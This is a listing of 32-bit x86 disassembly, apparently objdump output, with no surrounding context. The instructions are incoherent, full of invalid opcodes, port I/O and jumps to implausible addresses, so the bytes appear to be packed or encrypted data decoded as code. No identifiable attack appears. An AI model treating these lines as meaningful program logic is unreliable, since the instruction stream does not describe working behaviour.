  40b898:	mov    dl,BYTE PTR [ecx]
  40b89a:	out    0xa3,eax
  40b89c:	mov    bl,0x3e
  40b89e:	std    
  40b89f:	imul   eax,DWORD PTR [ebp+0x2eaeea34],0xb169c0f3
  40b8a9:	out    0x89,al
  40b8ab:	adc    edi,DWORD PTR [ebx+0x6b]
  40b8ae:	shl    BYTE PTR [ebx-0x681c3649],cl
  40b8b4:	lods   al,BYTE PTR ds:[esi]
  40b8b5:	into   
  40b8b6:	fcmovnbe st,st(6)
  40b8b8:	xchg   edx,eax
  40b8b9:	adc    DWORD PTR [edx-0x23],0xaf1d759d
  40b8c0:	(bad)  
  40b8c1:	mov    ecx,0x5919a7a7
  40b8c6:	js     0x40b899
  40b8c8:	cmp    DWORD PTR [eax+0x2],edi
  40b8cb:	ins    DWORD PTR es:[edi],dx
  40b8cc:	aad    0x45
  40b8ce:	or     al,0x92
  40b8d0:	sub    esi,DWORD PTR [eax+0x37]
  40b8d3:	jge    0x40b8e7
  40b8d5:	push   ds
  40b8d6:	retf   0x175f
  40b8d9:	imul   ebp,DWORD PTR [ecx+0x43],0x4
  40b8dd:	scas   al,BYTE PTR es:[edi]
  40b8de:	sbb    ebp,0x18
  40b8e1:	jg     0x40b925
  40b8e3:	mov    ah,0x30
  40b8e5:	xlat   BYTE PTR ds:[ebx]
  40b8e6:	ror    BYTE PTR [edx],0x7b
  40b8e9:	jmp    0x40b8b7
  40b8eb:	adc    DWORD PTR [ecx+0x0],eax
  40b8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ef:	or     BYTE PTR ds:0x9e2175e5,ch
  40b8f5:	sub    al,0x7
  40b8f7:	sub    ah,BYTE PTR [edi+eax*2+0x99c0106]
  40b8fe:	ror    BYTE PTR [ebp+ebp*8-0x48],cl
  40b902:	stos   DWORD PTR es:[edi],eax
  40b903:	and    al,0x43
  40b905:	shr    BYTE PTR [ebp+0x5c],0xdb
  40b909:	xor    ah,BYTE PTR [edx]
  40b90b:	adc    al,0x72
  40b90d:	shl    BYTE PTR [esi+0x1e],1
  40b910:	cmp    BYTE PTR [ebp+ebx*8+0x38],dh
  40b914:	or     DWORD PTR [eax+edi*2+0x22],0x58
  40b919:	jno    0x40b8a5
  40b91b:	and    al,0x1
  40b91d:	xchg   DWORD PTR [ebx+ebp*4],edx
  40b920:	xchg   ebp,eax
  40b921:	imul   esp,DWORD PTR [edx],0x1d5c522e
  40b927:	sahf   
  40b928:	out    0xea,eax
  40b92a:	call   0xf95489f9
  40b92f:	add    BYTE PTR [ebx+eax*1+0x583daca3],al
  40b936:	fs (bad) 
  40b938:	lods   eax,DWORD PTR ds:[esi]
  40b939:	ins    DWORD PTR es:[edi],dx
  40b93a:	into   
  40b93b:	jge    0x40b994
  40b93d:	pop    ebp
  40b93e:	fdivr  QWORD PTR [edi]
  40b940:	pop    es
  40b941:	pop    ds
  40b942:	lahf   
  40b943:	(bad)  
  40b944:	jmp    0x28de870c
  40b949:	pop    edx
  40b94a:	jns    0x40b950
  40b94c:	popf   
  40b94d:	adc    BYTE PTR [edi+0xb],bl
  40b950:	inc    eax
  40b951:	sbb    al,0x48
  40b953:	cs in  al,dx
  40b955:	jnp    0x40b8f5
  40b957:	jmp    0x40b983
  40b959:	xchg   ch,bl
  40b95b:	pop    eax
  40b95c:	std    
  40b95d:	push   edx
  40b95e:	adc    dh,BYTE PTR [edi-0x12]
  40b961:	cmp    DWORD PTR [ebp+0x730f8e04],0x8ea2207f
  40b96b:	fwait
  40b96c:	mov    cl,0x94
  40b96e:	gs xor al,0xec
  40b971:	in     al,dx
  40b972:	loope  0x40b954
  40b974:	mov    ebx,0x9219e379
  40b979:	push   esp
  40b97a:	pop    edi
  40b97b:	ins    DWORD PTR es:[edi],dx
  40b97c:	mov    eax,0x3b762328
  40b981:	and    cl,BYTE PTR [ecx*8-0x57154d4a]
  40b988:	les    ecx,FWORD PTR [edx+eiz*4+0x74]
  40b98c:	and    ebx,DWORD PTR [eax+edx*1+0x2d]
  40b990:	mov    bh,0x82
  40b992:	push   ds
  40b993:	pop    ds
  40b994:	sahf   
  40b995:	mov    bh,0xfd
  40b997:	xchg   esi,eax
  40b998:	cs shl ch,0x59
  40b99c:	jne    0x40b94d
  40b99e:	enter  0x1fa,0xfd
  40b9a2:	lea    ecx,[ebx+ebp*2]
  40b9a5:	inc    esi
  40b9a6:	dec    edx
  40b9a7:	fwait
  40b9a8:	jle    0x40b9b4
  40b9aa:	mov    esi,0x86474375
  40b9af:	scas   eax,DWORD PTR es:[edi]
  40b9b0:	sub    edi,ebp
  40b9b2:	ret    0x1964
  40b9b5:	pop    esi
  40b9b6:	xchg   ecx,eax
  40b9b7:	push   0x35
  40b9b9:	lods   al,BYTE PTR ds:[esi]
  40b9ba:	sub    eax,0xfd472477
  40b9bf:	or     ebp,DWORD PTR [eax]
  40b9c1:	stc    
  40b9c2:	jbe    0x40b963
  40b9c4:	add    eax,0x293530a0
  40b9c9:	scas   al,BYTE PTR es:[edi]
  40b9ca:	sbb    BYTE PTR [edx-0x74a03434],0x3b
  40b9d1:	lds    eax,FWORD PTR [eax-0x4597aa8a]
  40b9d7:	push   edi
  40b9d8:	out    0x50,eax
  40b9da:	pop    edx
  40b9db:	pop    ds
  40b9dc:	and    al,0xcf
  40b9de:	push   eax
  40b9df:	sub    al,0xb3
  40b9e1:	jp     0x40ba5c
  40b9e3:	mov    al,cl
  40b9e5:	cmp    al,0x7f
  40b9e7:	aaa    
  40b9e8:	adc    BYTE PTR [ecx],cl
  40b9ea:	cmp    BYTE PTR [esi+ebp*2],0x31
  40b9ee:	shl    DWORD PTR [edx+0x34],0xf
  40b9f2:	div    BYTE PTR [ecx-0x3a9372af]
  40b9f8:	inc    esp
  40b9f9:	mov    al,ds:0x388a5485
  40b9fe:	pop    ss
  40b9ff:	enter  0x301d,0x32
  40ba03:	xchg   edx,eax
  40ba04:	int3   
  40ba05:	cmp    bh,BYTE PTR [eax]
  40ba07:	mov    eax,ds:0xbeb7cd2a
  40ba0c:	mov    esp,DWORD PTR [edx]
  40ba0e:	inc    edx
  40ba0f:	sbb    DWORD PTR [ecx-0x3f48c948],esi
  40ba15:	dec    ecx
  40ba16:	cs xchg ebp,eax
  40ba18:	cld    
  40ba19:	mov    edi,0xf5aaa23
  40ba1e:	(bad)  
  40ba20:	jne    0x40baa1
  40ba22:	jmp    0x85cd:0x7f004b23
  40ba29:	loope  0x40ba49
  40ba2b:	pop    edi
  40ba2c:	xchg   ebp,eax
  40ba2d:	lds    ebp,FWORD PTR [edx-0x35]
  40ba30:	shl    DWORD PTR [ebp+esi*1-0x69],0xd7
  40ba35:	mov    ds:0x18496ff8,eax
  40ba3a:	aad    0x72
  40ba3c:	leave  
  40ba3d:	loopne 0x40ba25
  40ba3f:	adc    al,0x5c
  40ba41:	xchg   esp,eax
  40ba42:	pop    esp
  40ba43:	fadd   st(2),st
  40ba45:	(bad)  
  40ba47:	js     0x40baa7
  40ba49:	sub    BYTE PTR [ebp-0x38d8063b],0x6f
  40ba50:	aam    0xbe
  40ba52:	js     0x40ba28
  40ba54:	cmp    bh,cl
  40ba56:	push   0x6e
  40ba58:	loopne 0x40b9fb
  40ba5a:	es inc edx
  40ba5c:	scas   al,BYTE PTR es:[edi]
  40ba5d:	dec    esp
  40ba5e:	xchg   esp,eax
  40ba5f:	dec    ecx
  40ba60:	add    ecx,DWORD PTR [edx-0x72]
  40ba63:	(bad)  
  40ba64:	sub    eax,0x101e4407
  40ba69:	inc    ecx
  40ba6a:	jne    0x40ba15
  40ba6c:	shr    DWORD PTR [ebx+0x3bfd54fc],0xd7
  40ba73:	test   DWORD PTR [eax-0x95bd481],ecx
  40ba79:	push   ecx
  40ba7a:	(bad)  
  40ba7b:	and    ebp,DWORD PTR [edx+0x15]
  40ba7e:	fisub  WORD PTR [esi]
  40ba80:	dec    esp
  40ba81:	mov    ds:0x6c8e86c5,al
  40ba86:	mov    dl,0x75
  40ba88:	div    esp
  40ba8a:	dec    ecx
  40ba8b:	imul   eax,DWORD PTR [edi-0x3eb02679],0xdd80603c
  40ba95:	retf   0x3994
  40ba98:	sub    esp,DWORD PTR ds:0xb369e299
  40ba9e:	inc    esp
  40ba9f:	test   DWORD PTR [eax],edx
  40baa1:	push   eax
  40baa2:	add    BYTE PTR [ecx],ch
  40baa4:	repnz inc ebx
  40baa6:	or     BYTE PTR [ebx+0x29],bh
  40baa9:	(bad)  
  40baaa:	mov    eax,DWORD PTR [ecx+0x24]
  40baad:	fadd   st,st(6)
  40baaf:	pop    ecx
  40bab0:	fcom   DWORD PTR [ecx+0x72]
  40bab3:	push   esp
  40bab4:	mov    ch,0x80
  40bab6:	(bad)  
  40bab7:	aad    0x9a
  40bab9:	pop    eax
  40baba:	jne    0x40badc
  40babc:	lds    ebp,FWORD PTR [edx+0x35eff772]
  40bac2:	ins    BYTE PTR es:[edi],dx
  40bac3:	imul   bh
  40bac5:	inc    edi
  40bac6:	xlat   BYTE PTR ds:[ebx]
  40bac7:	mov    WORD PTR [edi],?
  40bac9:	std    
  40baca:	fwait
  40bacb:	inc    esp
  40bacc:	fdivrp st(3),st
  40bace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bacf:	xchg   eax,ebx
  40bad1:	shl    BYTE PTR [ecx],1
  40bad3:	mov    dh,0xc7
  40bad5:	rcr    DWORD PTR [ecx],cl
  40bad7:	ror    al,0xf4
  40bada:	jecxz  0x40bad1
  40badc:	(bad)  
  40badd:	pop    ss
  40bade:	sbb    ecx,DWORD PTR [ebx+eiz*8]
  40bae1:	fisub  DWORD PTR [ecx-0x80]
  40bae4:	ds and al,0x24
  40bae7:	mov    ch,0x12
  40bae9:	aaa    
  40baea:	mov    esp,DWORD PTR [esi]
  40baec:	push   eax
  40baed:	hlt    
  40baee:	mov    DWORD PTR [eax],edx
  40baf0:	sub    esi,DWORD PTR [ebx+0x28]
  40baf3:	sahf   
  40baf4:	pop    ds
  40baf5:	je     0x40bb0b
  40baf7:	test   DWORD PTR [edi],0x6a8063e0
  40bafd:	call   0x8f7add3e
  40bb02:	dec    esi
  40bb03:	xor    dh,ah
  40bb05:	sub    eax,0x4c906a6d
  40bb0a:	sbb    DWORD PTR [eax],esi
  40bb0c:	mov    ebx,?
  40bb0e:	push   esi
  40bb0f:	loopne 0x40bb1d
  40bb11:	adc    eax,0xdd02c717
  40bb16:	imul   ebx,edx,0xffffffee
  40bb19:	retf   0x46fd
  40bb1c:	mov    dh,0x9a
  40bb1e:	ins    DWORD PTR es:[edi],dx
  40bb1f:	inc    edx
  40bb20:	fsubr  DWORD PTR [edx]
  40bb22:	xor    al,BYTE PTR [esi+edx*1-0x31fc9eb4]
  40bb29:	pop    edi
  40bb2a:	inc    ebp
  40bb2b:	mov    edi,?
  40bb2d:	lods   eax,DWORD PTR ds:[esi]
  40bb2e:	add    al,0x99
  40bb30:	imul   edx,DWORD PTR [ecx-0x722c3730],0x1c523184
  40bb3a:	outs   dx,BYTE PTR ds:[esi]
  40bb3b:	lods   eax,DWORD PTR ds:[esi]
  40bb3c:	inc    edx
  40bb3d:	mov    dh,0xc
  40bb3f:	jge    0x40bb5d
  40bb41:	xchg   ebp,eax
  40bb42:	push   edi
  40bb43:	outs   dx,BYTE PTR ds:[esi]
  40bb44:	mov    WORD PTR [edi-0x2b],?
  40bb47:	mov    bl,0xea
  40bb49:	pop    esi
  40bb4a:	sub    BYTE PTR [edi+ebp*4],al
  40bb4d:	(bad)  
  40bb4e:	in     al,0x45
  40bb50:	pop    ecx
  40bb51:	jne    0x40bb96
  40bb53:	jns    0x40bb48
  40bb55:	push   eax
  40bb56:	push   esp
  40bb57:	inc    esp
  40bb58:	mov    ecx,0xf273062b
  40bb5d:	jnp    0x40bb8f
  40bb5f:	(bad)  
  40bb60:	in     eax,dx
  40bb61:	shl    DWORD PTR [ecx+0x3a],1
  40bb64:	fstp   TBYTE PTR [esi+0xe]
  40bb67:	cmp    ebx,esi
  40bb69:	inc    edx
  40bb6a:	adc    eax,0x1281740d
  40bb6f:	xor    edi,DWORD PTR [eax+eiz*4]
  40bb72:	fwait
  40bb73:	xchg   esi,eax
  40bb74:	jge    0x40bbd2
  40bb76:	es jns 0x40bb00
  40bb79:	hlt    
  40bb7a:	mov    esi,0x739d4fae
  40bb7f:	test   BYTE PTR [edi],ch
  40bb81:	fwait
  40bb82:	stos   BYTE PTR es:[edi],al
  40bb83:	test   BYTE PTR [esp+eiz*8],ch
  40bb86:	stos   BYTE PTR es:[edi],al
  40bb87:	sbb    BYTE PTR [esi+0x76ceb835],bh
  40bb8d:	adc    eax,0x14e93e8f
  40bb92:	mov    edi,ss
  40bb94:	xchg   edi,eax
  40bb95:	pop    esp
  40bb96:	pop    eax
  40bb97:	out    dx,eax
  40bb98:	xor    DWORD PTR [ebx+0x2f380ce8],edi
  40bb9e:	jne    0x40bb54
  40bba0:	cmp    al,0xfc
  40bba2:	ins    DWORD PTR es:[edi],dx
  40bba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bba4:	(bad)  [edi]
  40bba6:	imul   ebx,ebx,0x42235f45
  40bbac:	mov    edi,0x8ed2d02d
  40bbb1:	dec    ebx
  40bbb2:	cmc    
  40bbb3:	lock stc 
  40bbb5:	loopne 0x40bbcf
  40bbb7:	dec    eax
  40bbb8:	or     al,0xb3
  40bbba:	dec    esp
  40bbbb:	mov    bl,0x5f
  40bbbd:	fidivr WORD PTR [edx+0x1bf7bffc]
  40bbc3:	and    DWORD PTR [ecx-0xefec648],edi
  40bbc9:	(bad)  
  40bbca:	fcmovnb st,st(1)
  40bbcc:	sahf   
  40bbcd:	mov    ds:0xda396b49,eax
  40bbd3:	gs push cs
  40bbd5:	xchg   ecx,eax
  40bbd6:	sub    eax,0x591e5728
  40bbdb:	push   esp
  40bbdc:	sub    al,0xcc
  40bbde:	pop    es
  40bbdf:	cs loop 0x40bc15
  40bbe2:	(bad)  
  40bbe4:	or     dl,BYTE PTR [edx+eiz*4+0x35743f84]
  40bbeb:	cmp    BYTE PTR [edi+0x20f50b64],ah
  40bbf1:	and    ebp,DWORD PTR [esi-0xb3c5e4]
  40bbf7:	jmp    0xf77c5be0
  40bbfc:	jp     0x40bbb7
  40bbfe:	inc    edx
  40bbff:	push   ds
  40bc00:	sub    al,BYTE PTR [edx]
  40bc02:	repnz push eax
  40bc04:	out    dx,eax
  40bc05:	jmp    0x2d0:0xa29269de
  40bc0c:	pop    es
  40bc0d:	jmp    0x37eb8203
  40bc12:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40bc14:	rol    DWORD PTR [edi+0x17],1
  40bc17:	pop    ebp
  40bc18:	jle    0x40bc42
  40bc1a:	fs xor eax,0x887ce75b
  40bc20:	xchg   bh,al
  40bc22:	mov    dl,0x1f
  40bc24:	mov    dh,0x53
  40bc26:	dec    ebp
  40bc27:	test   eax,0x68b243a2
  40bc2c:	jbe    0x40bbcb
  40bc2e:	outs   dx,DWORD PTR ds:[esi]
  40bc2f:	sub    bh,al
  40bc31:	fxch   st(4)
  40bc33:	rol    BYTE PTR [esi+0x4e],cl
  40bc36:	push   0x564eab92
  40bc3b:	enter  0xbaa0,0x43
  40bc3f:	cld    
  40bc40:	or     esi,DWORD PTR [eax-0x46530c7a]
  40bc46:	mov    edi,0x6e7feb99
  40bc4b:	xchg   ch,dh
  40bc4d:	aam    0xd7
  40bc4f:	lahf   
  40bc50:	test   BYTE PTR [edx+0x2],al
  40bc53:	inc    ecx
  40bc54:	fcmovnb st,st(6)
  40bc56:	sti    
  40bc57:	push   edx
  40bc58:	and    eax,0xae4bf87
  40bc5d:	fadd   DWORD PTR [esi]
  40bc5f:	push   ebp
  40bc60:	and    al,0x39
  40bc62:	mov    ?,ebp
  40bc64:	xchg   esi,eax
  40bc65:	pop    edx
  40bc66:	xor    DWORD PTR [edx+edi*2+0x38],edi
  40bc6a:	adc    al,0xc1
  40bc6c:	outs   dx,BYTE PTR ds:[esi]
  40bc6d:	cdq    
  40bc6e:	mov    ds:0x35acaae6,al
  40bc73:	or     BYTE PTR [ebp-0x39],0x2c
  40bc77:	pop    edx
  40bc78:	dec    esp
  40bc79:	and    DWORD PTR [bx+si-0x617e],esi
  40bc7e:	xchg   ebp,eax
  40bc7f:	dec    esi
  40bc80:	mov    esp,esi
  40bc82:	js     0x40bc29
  40bc84:	pop    ecx
  40bc85:	cs imul eax,ebp,0x1e
  40bc89:	adc    al,0xa3
  40bc8b:	push   ebx
  40bc8c:	inc    esp
  40bc8d:	std    
  40bc8e:	xchg   BYTE PTR [ecx],dl
  40bc90:	mov    dl,BYTE PTR [eax+0x130889dc]
  40bc96:	or     DWORD PTR [esi],ecx
  40bc98:	jg     0x40bc23
  40bc9a:	lods   al,BYTE PTR ds:[esi]
  40bc9b:	xchg   BYTE PTR [edi],al
  40bc9d:	inc    esp
  40bc9e:	and    eax,0x51f9228f
  40bca3:	dec    edi
  40bca4:	or     BYTE PTR ds:0x6346dd97,bl
  40bcaa:	pop    edi
  40bcab:	dec    eax
  40bcac:	jo     0x40bcf1
  40bcae:	iret   
  40bcaf:	adc    eax,0xae14ef56
  40bcb4:	nop
  40bcb5:	jno    0x40bd0c
  40bcb7:	scas   al,BYTE PTR es:[edi]
  40bcb8:	outs   dx,DWORD PTR ds:[esi]
  40bcb9:	retf   
  40bcba:	mov    dl,0x6f
  40bcbc:	xor    edx,DWORD PTR [esi-0x6f4ace02]
  40bcc2:	in     eax,0x2b
  40bcc4:	push   ebx
  40bcc5:	scas   al,BYTE PTR es:[edi]
  40bcc6:	test   eax,0xf8925b28
  40bccb:	fadd   DWORD PTR [edx+0x62b7b1ba]
  40bcd1:	push   ss
  40bcd2:	lea    esi,[eax-0x17]
  40bcd5:	mov    ebx,0xde9c700e
  40bcda:	mov    eax,0xf9559cc6
  40bcdf:	int3   
  40bce0:	or     ah,dl
  40bce2:	cmp    al,0x3a
  40bce4:	pop    es
  40bce5:	pop    esi
  40bce6:	dec    esi
  40bce7:	xchg   ebx,eax
  40bce8:	or     cl,BYTE PTR [eax-0x62]
  40bceb:	imul   ebp,DWORD PTR gs:[edx+ecx*8-0x31],0xffffffdc
  40bcf1:	sbb    ah,BYTE PTR [eax]
  40bcf3:	or     eax,0x6b
  40bcf6:	fistp  QWORD PTR [edi+0x5ab99d50]
  40bcfc:	sub    eax,0x6d3d6f5f
  40bd01:	mov    cl,0x97
  40bd03:	sbb    ebp,DWORD PTR [edi+ebx*8-0x42aea47d]
  40bd0a:	xchg   ecx,eax
  40bd0b:	jge    0x40bd85
  40bd0d:	jg     0x40bced
  40bd0f:	fs inc ebp
  40bd11:	int    0x2e
  40bd13:	cmp    dh,0xec
  40bd16:	push   edx
  40bd17:	mov    cs,WORD PTR [ebx+0x76]
  40bd1a:	(bad)
  40bd1d:	mov    edi,0x13c3e80d
  40bd22:	or     al,0x9b
  40bd24:	aam    0xb2
  40bd26:	mov    ch,BYTE PTR [ebx]
  40bd28:	and    al,0x38
  40bd2a:	mov    bl,0xd1
  40bd2c:	loope  0x40bcb9
  40bd2e:	jno    0x40bd5a
  40bd30:	ins    BYTE PTR es:[edi],dx
  40bd31:	mov    ch,0x9a
  40bd33:	inc    esp
  40bd34:	popf   
  40bd35:	cs pop edi
  40bd37:	out    dx,al
  40bd38:	mov    al,0xd7
  40bd3a:	or     dl,BYTE PTR [edx-0x689c7a83]
  40bd40:	jle    0x40bdaa
  40bd42:	pop    eax
  40bd43:	push   ss
  40bd44:	push   ebp
  40bd45:	repnz dec eax
  40bd47:	popf   
  40bd48:	or     eax,0x9ce68ea2
  40bd4d:	test   BYTE PTR [esi],ah
  40bd4f:	or     BYTE PTR [ecx-0x50],ah
  40bd52:	lea    ebx,[ebp-0x1fab03cc]
  40bd58:	jp     0x40bd56
  40bd5a:	sub    esi,edi
  40bd5c:	xor    ch,BYTE PTR [ebp-0x4c]
  40bd5f:	ffree  st(0)
  40bd61:	mov    cl,0x88
  40bd63:	inc    eax
  40bd64:	jnp    0x40bd88
  40bd66:	out    dx,eax
  40bd67:	xor    BYTE PTR [edi-0x7cb891a7],0xaf
  40bd6e:	fnstenv [edi+0x29]
  40bd71:	out    0x1,eax
  40bd73:	je     0x40bd91
  40bd75:	mov    WORD PTR ds:0x94d3994f,?
  40bd7b:	pop    esi
  40bd7c:	aad    0xf6
  40bd7e:	adc    eax,0x3083e4a6
  40bd83:	pop    edi
  40bd84:	mov    cl,0xa9
  40bd86:	cs inc ebp
  40bd88:	div    DWORD PTR [esi-0x2]
  40bd8b:	fsubr  DWORD PTR [eax+0x26]
  40bd8e:	push   ebp
  40bd8f:	inc    eax
  40bd90:	pop    eax
  40bd91:	cmp    DWORD PTR [esi+0x7a1ca619],0xffffff8c
  40bd98:	stc    
  40bd99:	mov    ebx,0xd504e0ee
  40bd9e:	push   edi
  40bd9f:	inc    esp
  40bda0:	out    dx,al
  40bda1:	je     0x40be10
  40bda3:	xor    dl,bl
  40bda5:	and    al,0x75
  40bda7:	xchg   ebx,eax
  40bda8:	inc    ecx
  40bda9:	popf   
  40bdaa:	adc    ebx,DWORD PTR [esi]
  40bdac:	mov    bh,0x4
  40bdae:	je     0x40be16
  40bdb0:	xchg   edi,eax
  40bdb1:	or     eax,0x8532376b
  40bdb6:	push   cs
  40bdb7:	fwait
  40bdb8:	imul   ebx,eax,0x38
  40bdbb:	leave  
  40bdbc:	ja     0x40bd86
  40bdbe:	sti    
  40bdbf:	aam    0xde
  40bdc1:	dec    esi
  40bdc2:	stos   BYTE PTR es:[edi],al
  40bdc3:	enter  0x8d0a,0xee
  40bdc7:	sbb    ecx,esi
  40bdc9:	retf   
  40bdca:	mov    bh,0xec
  40bdcc:	in     al,dx
  40bdcd:	ins    DWORD PTR es:[edi],dx
  40bdce:	dec    ebp
  40bdcf:	retf   0x49e6
  40bdd2:	xchg   BYTE PTR [ebp-0x225e0820],al
  40bdd8:	sub    DWORD PTR [edi],0x79
  40bddb:	fldenv [edi]
  40bddd:	ins    DWORD PTR es:[edi],dx
  40bdde:	inc    esp
  40bddf:	les    ebx,FWORD PTR [ecx]
  40bde1:	mov    ss,WORD PTR [ecx]
  40bde3:	test   al,0x0
  40bde5:	add    al,0x3a
  40bde7:	cwde   
  40bde8:	lock outs dx,BYTE PTR ds:[esi]
  40bdea:	lea    ebp,[esi-0x41]
  40bded:	pop    es
  40bdee:	pop    es
  40bdef:	dec    ebx
  40bdf0:	mov    eax,ds:0x70692189
  40bdf5:	mov    ds:0x2fd17256,al
  40bdfa:	adc    al,0xed
  40bdfc:	sti    
  40bdfd:	cwde   
  40bdfe:	jb     0x40be4a
  40be00:	mov    eax,0xd8d5c850
  40be05:	or     eax,0xb6e4f73
  40be0a:	pop    esi
  40be0b:	rcl    ebx,cl
  40be0d:	push   ecx
  40be0e:	inc    ebx
  40be0f:	inc    ebp
  40be10:	sub    DWORD PTR [edx+0x5a],esp
  40be13:	mov    ds:0x2bc292aa,al
  40be18:	jnp    0x40be22
  40be1a:	scas   al,BYTE PTR es:[edi]
  40be1b:	sub    eax,0x6535fd63
  40be20:	fisttp DWORD PTR [eax+0x60]
  40be23:	mul    BYTE PTR [ebx-0x259742fd]
  40be29:	mov    dl,0xe6
  40be2b:	pop    ecx
  40be2c:	inc    esp
  40be2d:	pop    ebp
  40be2e:	test   BYTE PTR [edx+0x605731d9],ch
  40be34:	ficom  DWORD PTR [edx+esi*1]
  40be37:	mov    BYTE PTR [eax-0x550ad50],bl
  40be3d:	jmp    0xcf494898
  40be42:	das    
  40be43:	inc    ebp
  40be44:	ror    ch,1
  40be46:	push   esp
  40be47:	es mov ebx,0x71eef53
  40be4d:	rol    DWORD PTR [esp+ebx*4+0x557ed79d],cl
  40be54:	or     al,0xb1
  40be56:	sub    bh,BYTE PTR [edi+0x567d910d]
  40be5c:	and    dh,al
  40be5e:	mov    edi,0x62dd11f6
  40be63:	or     al,BYTE PTR [eax+0x58280699]
  40be69:	xor    eax,0xe685ddf1
  40be6e:	xor    DWORD PTR [ecx+0x4f],ebp
  40be71:	xor    al,0x46
  40be73:	jp     0x40be6e
  40be75:	jle    0x40be53
  40be77:	ins    BYTE PTR es:[edi],dx
  40be78:	push   ecx
  40be79:	sub    BYTE PTR [edi-0x18],cl
  40be7c:	inc    ebp
  40be7d:	jge    0x40bef0
  40be7f:	fs mov edx,0x367b8f55
  40be85:	push   esp
  40be86:	mov    cl,0x3e
  40be88:	dec    edi
  40be89:	stc    
  40be8a:	cmp    eax,0xa469ea5a
  40be8f:	pop    esp
  40be90:	jl     0x40be44
  40be92:	xchg   ebp,eax
  40be93:	cdq    
  40be94:	popf   
  40be95:	mov    DWORD PTR [esi+0x5da28dc0],0xb68a3941
  40be9f:	sub    al,0x96
  40bea1:	test   DWORD PTR [ecx+0x667009af],esp
  40bea7:	mov    esi,0x2b56fde0
  40beac:	add    al,0xc0
  40beae:	mov    eax,0xd1ac887
  40beb3:	jo     0x40bef2
  40beb5:	add    ebp,edi
  40beb7:	dec    ebx
  40beb8:	(bad)  
  40beb9:	(bad)  
  40beba:	stc    
  40bebb:	add    BYTE PTR [edi+0x15],dl
  40bebe:	adc    BYTE PTR [edx+0x1b1f61f2],dl
  40bec4:	inc    edx
  40bec5:	xchg   ebp,eax
  40bec6:	aam    0x3e
  40bec8:	pop    ds
  40bec9:	xchg   edi,eax
  40beca:	cmp    al,BYTE PTR [ebx+ecx*1-0x42]
  40bece:	rcr    ah,1
  40bed0:	adc    BYTE PTR [esi],cl
  40bed2:	inc    ecx
  40bed3:	into   
  40bed4:	push   edi
  40bed5:	and    eax,0x2655b50b
  40beda:	sub    eax,0x68f2d6f9
  40bedf:	mov    ?,WORD PTR [esp+eax*2+0x25]
  40bee3:	stc    
  40bee4:	les    ebx,FWORD PTR [esi+edx*8-0x1b]
  40bee8:	popf   
  40bee9:	inc    ebp
  40beea:	nop
  40beeb:	ffreep st(0)
  40beed:	sub    BYTE PTR [edx+0x41],al
  40bef0:	dec    ecx
  40bef1:	stos   BYTE PTR es:[edi],al
  40bef2:	int3   
  40bef3:	sahf   
  40bef4:	or     esp,DWORD PTR [edx-0x2e8793c]
  40befa:	jecxz  0x40bf06
  40befc:	cmp    al,al
  40befe:	cmp    DWORD PTR [edi+edi*1],ecx
  40bf01:	mov    ecx,0x5fc4bdeb
  40bf06:	in     eax,0x9b
  40bf08:	dec    ecx
  40bf09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf0a:	sub    al,BYTE PTR fs:[edi+0x5f]
  40bf0e:	loope  0x40bedc
  40bf10:	sbb    ecx,0x47
  40bf13:	mov    ebx,0x87e03fdb
  40bf18:	xchg   ebp,eax
  40bf19:	sub    bh,bl
  40bf1b:	lahf   
  40bf1c:	xchg   ecx,eax
  40bf1d:	mov    ds:0x1b856b62,al
  40bf22:	pop    ds
  40bf23:	mov    al,ds:0xfd3fcfaf
  40bf28:	xchg   esi,eax
  40bf29:	and    bh,BYTE PTR [ecx+0x7e436fb0]
  40bf2f:	in     eax,0xac
  40bf31:	and    BYTE PTR [eax],ah
  40bf33:	push   eax
  40bf34:	adc    DWORD PTR ds:0x94d86386,ebx
  40bf3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf3b:	dec    ecx
  40bf3c:	imul   esi,DWORD PTR [edx],0xf3427f7e
  40bf42:	lods   al,BYTE PTR ds:[esi]
  40bf43:	stos   DWORD PTR es:[edi],eax
  40bf44:	arpl   WORD PTR [ebx+0x2fb2e31b],sp
  40bf4a:	ins    DWORD PTR es:[edi],dx
  40bf4b:	pop    ecx
  40bf4c:	out    0x91,al
  40bf4e:	lock sub BYTE PTR [eax-0x6],bl
  40bf52:	fcomp  QWORD PTR [edi-0x6c6beb7e]
  40bf58:	mov    dl,0xed
  40bf5a:	inc    ebx
  40bf5b:	cmp    ah,BYTE PTR ds:0x15f7adaf
  40bf61:	je     0x40bfb7
  40bf63:	outs   dx,DWORD PTR ds:[esi]
  40bf64:	ror    BYTE PTR [edx],1
  40bf66:	cmp    edi,0x94d5e6e5
  40bf6c:	xor    al,0x65
  40bf6e:	loopne 0x40bf7f
  40bf70:	and    BYTE PTR [edx],dl
  40bf72:	adc    dl,BYTE PTR [eax-0x692926fb]
  40bf78:	cmp    DWORD PTR [ebx-0x1663b6f5],edi
  40bf7e:	or     DWORD PTR [eax-0x654766af],edi
  40bf84:	xor    esp,DWORD PTR [edx+0x6944633f]
  40bf8a:	sub    DWORD PTR [edx],ecx
  40bf8c:	jl     0x40bffd
  40bf8e:	(bad)  [esi+0x65]
  40bf91:	popf   
  40bf92:	adc    DWORD PTR [ebx],eax
  40bf94:	leave  
  40bf95:	fadd   DWORD PTR [ebx-0x434f9820]
  40bf9b:	inc    edi
  40bf9c:	in     eax,0x96
  40bf9e:	arpl   WORD PTR [ebp-0x27d1cde8],bx
  40bfa4:	jmp    0x40bf8f
  40bfa6:	(bad)  
  40bfa7:	neg    BYTE PTR [eax-0x19]
  40bfaa:	or     ebx,DWORD PTR [eax]
  40bfac:	aas    
  40bfad:	out    dx,al
  40bfae:	cwde   
  40bfaf:	lods   eax,DWORD PTR ss:[esi]
  40bfb1:	sub    DWORD PTR [eax+0x7d],esp
  40bfb4:	in     al,0x90
  40bfb6:	mov    ecx,0x13a6225e
  40bfbb:	push   es
  40bfbc:	outs   dx,DWORD PTR ds:[esi]
  40bfbd:	fsubr  QWORD PTR [edi-0x23]
  40bfc0:	push   ebp
  40bfc1:	dec    edi
  40bfc2:	push   0x6e918e9
  40bfc7:	xchg   ebx,eax
  40bfc8:	(bad)  
  40bfc9:	shl    DWORD PTR [edx+0x50],cl
